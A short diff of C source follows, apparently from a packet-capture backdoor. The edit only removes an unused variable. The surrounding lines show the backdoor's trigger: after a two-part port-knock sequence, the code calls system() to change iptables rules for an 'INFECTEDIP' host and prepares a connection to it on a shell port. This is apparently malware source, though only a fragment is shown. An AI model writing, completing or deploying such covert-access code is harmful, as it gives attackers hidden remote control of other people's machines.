@@ -22,7 +22,6 @@ int Packetcapture(){
     char errorbuffer[PCAP_ERRBUF_SIZE];
     struct bpf_program fp; //holds fp program info
     pcap_if_t *interface_list;
-    pcap_t* interfaceinfo;
     bpf_u_int32 netp; //holds the ip
 
     //find the first network device capable of packet capture
@@ -158,8 +157,6 @@ void ParsePattern(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* 
         }
     }
     if((knocking[0] == 1) && (knocking[1] == 1)){
-        pcap_t* interfaceinfo;
-
         system(IPTABLES(INFECTEDIP));
         char *dip = INFECTEDIP;
         unsigned short sport = SHPORT;
